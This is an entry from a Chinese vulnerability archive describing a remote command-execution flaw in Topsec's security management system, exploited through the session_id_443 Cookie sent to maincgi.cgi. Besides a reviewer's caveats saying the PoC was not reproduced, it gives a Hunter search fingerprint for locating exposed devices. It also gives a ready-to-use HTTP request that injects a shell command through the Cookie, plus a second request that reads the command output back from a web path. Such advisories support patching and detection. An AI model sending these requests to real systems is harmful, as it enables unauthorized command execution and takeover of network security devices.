---
source: "wy876 漏洞文库"
id: "vw-d72ca733e185728e82db9228"
entity_id: "ve-d72ca733e185728e82db9228"
schema_version: "1"
fofa_unverified: "web.body="
title: "天融信TOPSEC Cookie 远程命令执行漏洞"
product: "Topsec安全管理系统，具体型号不明"
record_type: "advisory"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "构造Cookie，未给版本/其他认证条件"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/%E5%A4%A9%E8%9E%8D%E4%BF%A1/%E5%A4%A9%E8%9E%8D%E4%BF%A1TOPSECCookie%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/ff91c9eyvw89wgfb"
source_status: "recorded"
---

# 天融信TOPSEC Cookie 远程命令执行漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Topsec安全管理系统，具体型号不明
- 本文讨论：maincgi.cgi session_id_443命令执行
- 版本、权限与配置前提：构造Cookie，未给版本/其他认证条件
- 资料类型：Cookie命令注入请求摘要；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 仅请求和文件读回无响应；附件名test_qrcode_b-rce与主体不吻合需检查附件内容
- fofa为残缺Hunter字段，缺原始公告/修复
- 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据

### 待核与来源

- 产品型号、认证机制及模板内容待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
<font style="color:rgb(77, 77, 77);">天融信TopSec安全管理系统 Cookie字段存在远程命令执行漏洞，通过该漏洞，攻击者可通过构造恶意字符串，执行任意系统命令，从而拿下服务器权限。</font>

# <font style="color:rgb(77, 77, 77);">二、影响版本</font>
+ <font style="color:rgb(77, 77, 77);">天融信TopSec安全管理系统</font>

# <font style="color:rgb(77, 77, 77);">三、资产测绘</font>
+ hunter`web.body="/cgi/maincgi.cgi?Url=VerifyCode"`
+ 特征


# 四、漏洞复现
```http
GET /cgi/maincgi.cgi?Url=aa HTTP/1.1
Host: 
Cookie: session_id_443=1|echo `id`  > /www/htdocs/site/image/tt.txt;
User-Agent: Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36
```


获取命令执行结果

```http
GET /site/image/tt.txt HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36
```


[test_qrcode_b-rce.yaml](https://www.yuque.com/attachments/yuque/0/2024/yaml/1622799/1709222234675-5ae23a8d-103c-4fab-bc8f-c12a5b7ca4fe.yaml)


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ff91c9eyvw89wgfb>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
